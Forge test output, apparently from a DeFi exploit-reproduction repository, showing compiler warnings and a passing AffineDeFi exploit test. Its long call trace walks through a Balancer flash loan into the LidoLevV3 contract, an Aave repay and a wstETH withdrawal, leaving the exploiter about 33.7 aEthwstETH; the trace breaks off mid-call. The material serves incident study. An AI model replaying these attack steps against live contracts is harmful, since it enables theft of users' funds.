Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.20s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-02/AffineDeFi_exp.sol:25:5:
   |
25 |     address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 293.55ms (187.72Вµs CPU time)

Ran 1 test for src/test/2024-02/AffineDeFi_exp.sol:ExploitTest
[PASS] testExploit() (gas: 760395)
Logs:
  Exploiter aEthwstETH balance before attack: 0.000000000000000000
  Exploiter aEthwstETH balance after attack: 33.698806193381635860

Traces:
  [836095] ExploitTest::testExploit()
    в”њв”Ђ [23044] aEthwstETH::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в”њв”Ђ [17992] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::balanceOf(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    в”‚   в”‚   в”њв”Ђ [10318] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [5266] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [2874] aEthwstETH::decimals() [staticcall]
    в”‚   в”њв”Ђ [2357] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::decimals() [delegatecall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в””в”Ђ в†ђ [Return] 18
    в”њв”Ђ emit log_named_decimal_uint(key: "Exploiter aEthwstETH balance before attack", val: 0, decimals: 18)
    в”њв”Ђ [632675] Balancer::flashLoan(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [318973831042619036856 [3.189e20]], 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    в”‚   в”њв”Ђ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 55912009748616849239618 [5.591e22]
    в”‚   в”њв”Ђ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”њв”Ђ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20])
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 318973831042619036856 [3.189e20])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [576214] LidoLevV3::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [318973831042619036856 [3.189e20]], [0], 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    в”‚   в”‚   в”њв”Ђ [17132] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [12080] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6919] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [6399] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 353976785545105115749 [3.539e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 353976785545105115749 [3.539e20]
    в”‚   в”‚   в”њв”Ђ [5544] aEthwstETH::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [4992] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1818] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1266] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedIncome(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000033b9de7e3d39a6f9a7c08df
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 340788235238642068114 [3.407e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 340788235238642068114 [3.407e20]
    в”‚   в”‚   в”њв”Ђ [130184] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::repay(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 318973831042619036856 [3.189e20], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
    в”‚   в”‚   в”‚   в”њв”Ђ [129649] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::repay(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 318973831042619036856 [3.189e20], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [125503] 0x5547D7d54d10C359108e36d098016c4020443Fd4::40e95de6(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003682b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f29000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000114aa6b15664c654b80000000000000000000000000000000000000000000000000000000000000002000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2968] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2419] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005ff94c853621776abec3
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005ff94c853621776abec3
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9982] 0x102633152313C81cD80419b6EcF66d14Ad68949A::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4921] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3201] 0x102633152313C81cD80419b6EcF66d14Ad68949A::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2649] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3038] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2486] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1325] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [805] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 353976785545105115749 [3.539e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 353976785545105115749 [3.539e20]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [26087] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20], 1035024658069051456948664591 [1.035e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [25526] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20], 1035024658069051456948664591 [1.035e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7701] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 453223569019806123998915 [4.532e23], 341998408236463123361 [3.419e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 453223569019806123998915 [4.532e23], 341998408236463123361 [3.419e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 318944848550144700161 [3.189e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Burn(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 0x0000000000000000000000000000000000000000, param2: 318944848550144700161 [3.189e20], param3: 28982492474336695 [2.898e16], param4: 1035024658069051456948664591 [1.035e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7160] 0x06B1Ec378618EA736a65395eA5CAB69A2410493B::calculateInterestRates((0, 318973831042619036856 [3.189e20], 0, 0, 468778595722517357445717 [4.687e23], 0, 1500, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 143009253559093150188127 [1.43e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000cd4660e7e92740cb1f08c0000000000000000000000000000000000000000004c21b47d6a4f6177e9af7e00000000000000000000000000000000000000000013b568bb97eaae18239472
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param1: 15510134142072623979425932 [1.551e25], param2: 92037529835702665603559294 [9.203e25], param3: 23826270884991865922491506 [2.382e25], param4: 1019369531491344843689208548 [1.019e27], param5: 1035024658069051456948664591 [1.035e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, 318973831042619036856 [3.189e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8, value: 318973831042619036856 [3.189e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3136] 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8::handleRepayment(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [578] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::handleRepayment(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 318973831042619036856 [3.189e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Repay(param0: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param1: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param2: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param3: 318973831042619036856 [3.189e20], param4: false)
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000114aa6b15664c654b8
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 318973831042619036856 [3.189e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 318973831042619036856 [3.189e20]
    в”‚   в”‚   в”њв”Ђ [230564] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::withdraw(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 307089429045260432253 [3.07e20], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
    в”‚   в”‚   в”‚   в”њв”Ђ [230003] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::withdraw(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 307089429045260432253 [3.07e20], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2402] 0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e::getPriceOracle() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x54586bE62E3c3580375aE3723C145253060Ca0C2
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [216282] 0x589F82Ff8162Fa96545b435435713E9D6ca79fBB::186dea44(00000000000000000000000000000000000000000000000000000000000000340000000000000000000000000000000000000000000000000000000000000036000000000000000000000000000000000000000000000000000000000000003782b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f290000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000000000000000000000000000000000000000000000010a5b8d0afe845b37d000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae142000000000000000000000000000000000000000000000000000000000000001b00000000000000000000000054586be62e3c3580375ae3723c145253060ca0c20000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4968] 0xC96113eED8cAB59cD8A66813bCB0cEb29F06D2e4::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2419] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000d88d7ff1f4a7fa717f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000d88d7ff1f4a7fa717f
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7482] 0x39739943199c0fBFe9E5f1B5B160cd73a64CB85D::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [4921] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1146] aEthwstETH::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [626] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000001276e4e57722ab312e
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000001276e4e57722ab312e
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [9660] 0x7b8Fa4540246554e77FCFf140f9114de00F8bB8D::calculateInterestRates((0, 0, 307089429045260432253 [3.07e20], 0, 4011075626650731686335 [4.011e21], 0, 1500, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x0B925eD163218f6662a35e0f0371Ac234f9E9371)) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2534] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::balanceOf(aEthwstETH: [0x0B925eD163218f6662a35e0f0371Ac234f9E9371]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 837016567033426250977516 [8.37e23]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000000000000000000000000028e7cf6194a37766d620000000000000000000000000000000000000000003e63ac0a117aa9ac9230ef00000000000000000000000000000000000000000002766ce68fdf7f0444770c
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit ReserveDataUpdated(param0: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, param1: 12073175036517569424738 [1.207e22], param2: 75424088663387665897500911 [7.542e25], param3: 2977099746311124134688524 [2.977e24], param4: 1000527341973624759506438367 [1e27], param5: 1004101134483577325977691581 [1.004e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [47493] aEthwstETH::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 307089429045260432253 [3.07e20], 1000527341973624759506438367 [1e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [46929] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 307089429045260432253 [3.07e20], 1000527341973624759506438367 [1e27]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3201] 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840584271767809850220061 [8.405e23], 340608618017782968622 [3.406e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2675] 0xE7B67F44eA304DD7f6d215b13686637ff64CD2B2::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840584271767809850220061 [8.405e23], 340608618017782968622 [3.406e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 307089409295028918916 [3.07e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Burn(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param2: 307089409295028918916 [3.07e20], param3: 19750231513337 [1.975e13], param4: 1000527341973624759506438367 [1e27])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [28068] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 307089429045260432253 [3.07e20])
